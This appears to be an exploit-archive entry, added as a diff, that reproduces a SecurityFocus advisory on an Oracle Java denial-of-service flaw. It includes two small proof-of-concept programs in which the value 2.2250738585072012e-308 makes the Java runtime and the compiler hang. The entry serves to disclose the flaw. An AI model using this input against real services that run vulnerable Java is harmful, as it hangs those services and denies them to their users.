@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/46091/info
+
+Oracle Java is prone to a remote denial-of-service vulnerability.
+
+Successful attacks will cause applications written in Java to hang, creating a denial-of-service condition.
+
+This issue affects both the Java compiler and Runtime Environment. 
+
+Send a Java Program Into An Infinite Loop
+
+Compile this program and run it; the program will hang (at least it does on a 32-bit system with the latest JRE/JDK):
+
+class runhang {
+public static void main(String[] args) {
+  System.out.println("Test:");
+  double d = Double.parseDouble("2.2250738585072012e-308");
+  System.out.println("Value: " + d);
+ }
+}
+
+Send the Java Compiler Into An Infinite Loop
+
+Try to compile this program; the compiler will hang:
+
+class compilehang {
+public static void main(String[] args) {
+  double d = 2.2250738585072012e-308;
+  System.out.println("Value: " + d);
+ }
+}
